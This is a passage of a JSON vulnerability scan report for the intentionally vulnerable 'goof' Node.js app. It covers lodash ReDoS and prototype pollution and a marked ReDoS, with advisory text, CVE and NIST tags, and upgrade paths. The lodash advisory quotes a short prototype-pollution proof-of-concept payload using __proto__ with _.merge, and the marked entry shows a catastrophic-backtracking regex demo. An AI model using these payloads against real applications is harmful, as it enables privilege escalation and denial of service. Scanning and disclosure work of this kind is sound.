\"2022-04-05T12:27:32.267901Z\",\n  \"moduleName\": \"lodash\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"lodash\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-04-05T09:14:22Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/lodash/lodash/commit/5c08f18d365b64063bfbfa686cbb97cdd6267347\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/lodash/lodash/pull/4450\"\n    },\n    {\n      \"title\": \"POC: GitHub Issue\",\n      \"url\": \"https://github.com/lodash/lodash/issues/3359\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.17.11\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"lodash@4.17.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"lodash@4.17.11\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"lodash\",\n  \"version\": \"4.17.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , lodash@4.17.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2018-3721"
            ],
            "ghsaid": [
              "2m96-9w4j-wgv7",
              "46fh-8fc5-xcwx",
              "5947-m4fg-xhqg",
              "fvqr-27wr-82fm"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "npm:lodash:20180130",
          "desc": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the `Object` prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.  \r\n\r\n## PoC by Olivier Arteau (HoLyVieR)\r\n```js\r\nvar _= require('lodash');\r\nvar malicious_payload = '{\"__proto__\":{\"oops\":\"It works !\"}}';\r\n\r\nvar a = {};\r\nconsole.log(\"Before : \" + a.oops);\r\n_.merge({}, JSON.parse(malicious_payload));\r\nconsole.log(\"After : \" + a.oops);\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.5 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4337)\n- [HackerOne Report](https://hackerone.com/reports/310443)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1067)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1069)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1070)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P\",\n  \"alternativeIds\": [\n    \"SNYK-JS-LODASH-174180\"\n  ],\n  \"creationTime\": \"2018-02-12T22:28:27.654000Z\",\n  \"credit\": [\n    \"Olivier Arteau (HoLyVieR)\"\n  ],\n  \"cvssScore\": 6.3,\n  \"description\": \"## Overview\\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the `Object` prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.  \\r\\n\\r\\n## PoC by Olivier Arteau (HoLyVieR)\\r\\n```js\\r\\nvar _= require('lodash');\\r\\nvar malicious_payload = '{\\\"__proto__\\\":{\\\"oops\\\":\\\"It works !\\\"}}';\\r\\n\\r\\nvar a = {};\\r\\nconsole.log(\\\"Before : \\\" + a.oops);\\r\\n_.merge({}, JSON.parse(malicious_payload));\\r\\nconsole.log(\\\"After : \\\" + a.oops);\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `lodash` to version 4.17.5 or higher.\\n## References\\n- [GitHub Commit](https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a)\\n- [GitHub PR](https://github.com/lodash/lodash/pull/4337)\\n- [HackerOne Report](https://hackerone.com/reports/310443)\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1067)\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1069)\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1070)\\n\",\n  \"disclosureTime\": \"2018-01-30T22:28:27Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.17.5\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"dist/lodash.js\",\n        \"functionName\": \"merge\"\n      },\n      \"version\": [\n        \">= 1.0.0 <1.0.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"merge\"\n      },\n      \"version\": [\n        \">=0.9.0 <1.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"dist/lodash.js\",\n        \"functionName\": \"runInContext.merge\"\n      },\n      \"version\": [\n        \">=1.1.0 <2.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.merge\"\n      },\n      \"version\": [\n        \">=2.0.0 <3.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"runInContext.baseMergeDeep\"\n      },\n      \"version\": [\n        \">=3.0.0 <4.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.baseMerge\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.5\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.baseMergeDeep\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.5\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"dist/lodash.js\",\n        \"functionName\": \"merge\"\n      },\n      \"version\": [\n        \">= 1.0.0 <1.0.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"merge\"\n      },\n      \"version\": [\n        \">=0.9.0 <1.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"dist/lodash.js\",\n        \"functionName\": \"runInContext.merge\"\n      },\n      \"version\": [\n        \">=1.1.0 <2.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.merge\"\n      },\n      \"version\": [\n        \">=2.0.0 <3.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"runInContext.baseMergeDeep\"\n      },\n      \"version\": [\n        \">=3.0.0 <4.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.baseMerge\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.5\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.baseMergeDeep\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.5\"\n      ]\n    }\n  ],\n  \"id\": \"npm:lodash:20180130\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-LODASH-174180\"\n    ],\n    \"CVE\": [\n      \"CVE-2018-3721\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-2m96-9w4j-wgv7\",\n      \"GHSA-46fh-8fc5-xcwx\",\n      \"GHSA-5947-m4fg-xhqg\",\n      \"GHSA-fvqr-27wr-82fm\"\n    ],\n    \"NSP\": [\n      \"1067\",\n      \"1069\",\n      \"1070\",\n      \"577\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-04-05T12:26:34.848392Z\",\n  \"moduleName\": \"lodash\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"lodash\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:lodash:20180130:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.883000Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/lodash/20180130/20180130_0_0_lodash_d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a.patch\"\n      ],\n      \"version\": \"=3.10.1\"\n    }\n  ],\n  \"proprietary\": true,\n  \"publicationTime\": \"2018-02-14T13:22:50Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/lodash/lodash/pull/4337\"\n    },\n    {\n      \"title\": \"HackerOne Report\",\n      \"url\": \"https://hackerone.com/reports/310443\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/1067\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/1069\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/1070\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.17.5\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"lodash@4.17.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"lodash@4.17.5\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"lodash\",\n  \"version\": \"4.17.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , lodash@4.17.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-MARKED-174116",
          "desc": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The `inline.text regex` may take quadratic time to scan for potential email addresses starting at every point.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 0.6.2 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/commit/00f1f7a23916ef27186d0904635aa3509af63d47)\n- [GitHub Commit](https://github.com/markedjs/marked/pull/1460/commits/be27472a8169dda7875330939f8115ab677cdc07)\n- [GitHub PR](https://github.com/markedjs/marked/pull/1460)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/812)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-04-07T06:53:01.452330Z\",\n  \"credit\": [\n    \"Anders Kaseorg\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The `inline.text regex` may take quadratic time to scan for potential email addresses starting at every point.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `marked` to version 0.6.2 or higher.\\n## References\\n- [GitHub Commit](https://github.com/markedjs/marked/commit/00f1f7a23916ef27186d0904635aa3509af63d47)\\n- [GitHub Commit](https://github.com/markedjs/marked/pull/1460/commits/be27472a8169dda7875330939f8115ab677cdc07)\\n- [GitHub PR](https://github.com/markedjs/marked/pull/1460)\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/812)\\n\",\n  \"disclosureTime\": \"2019-04-04T20:27:50Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.6.2\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MARKED-174116\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"NSP\": [\n      \"812\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:40:53.174353Z\",\n  \"moduleName\": \"marked\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"marked\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-04-07T06:53:47Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/markedjs/marked/commit/00f1f7a23916ef27186d0904635aa3509af63d47\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/markedjs/marked/pull/1460/commits/be27472a8169dda7875330939f8115ab677cdc07\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/markedjs/marked/pull/1460\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/812\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=0.1.3 <0.6.2\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"marked@0.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"marked@0.6.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"marked\",\n  \"version\": \"0.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , marked@0.3.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1333"
            ],
            "cveid": [
              "2022-21681"
            ],
            "ghsaid": [
